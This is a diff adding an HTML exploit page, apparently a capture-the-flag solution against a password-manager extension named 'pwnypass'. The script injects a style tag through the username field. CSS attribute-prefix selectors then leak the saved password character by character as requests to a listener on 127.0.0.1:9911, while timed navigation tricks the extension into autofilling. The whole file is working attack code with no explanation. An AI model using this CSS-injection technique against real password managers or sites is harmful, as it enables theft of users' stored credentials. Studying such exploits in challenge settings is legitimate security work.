@@ -1,0 +1,49 @@
+<html>
+    <head>
+        <script>
+            const sleep = (t) => new Promise((r) => setTimeout(r, t));
+            const fakeURL = 'https://pwnypass.c.hc.lc/login.php';
+            const knownFlag = new URLSearchParams(window.location.search).get("known");
+            const letters = "12345"
+
+            function createStyle() {
+                return letters.split("")
+                    .map(c => `[data-password^='${knownFlag + c}']{ background: url(http://127.0.0.1:9911/c.css/?c=${knownFlag + c}) }`)
+                    .join("\n")
+            }
+
+            window.addEventListener("load", async () => {
+                await sleep(500);
+                const $u = document.querySelector("input[type='text']");
+                const $p = document.querySelector("input[type='password']");
+                $u.value = `"\>\<style\>${createStyle()}\</style\>`;
+                $p.value = "test";
+                await sleep(200);
+
+                window.location.assign(fakeURL);
+                $u.dispatchEvent(new Event("change"));
+                await sleep(25);
+                window.stop()
+
+                await sleep(500);
+
+                window.location.assign(fakeURL);
+                $p.form.dispatchEvent(new Event("submit"));
+                await sleep(25);
+                window.stop()
+
+                const win = window.open(fakeURL);
+                await sleep(2500);
+                win.close();
+                window.location.assign("/")
+            })
+        </script>
+    </head>
+    <body>
+        <form method="POST">
+            <input name="username" type="text" style="width: 45%">
+            <input name="password" type="password" style="width: 45%">
+            <input name="submit" type="submit">
+        </form>
+    </body>
+</html>
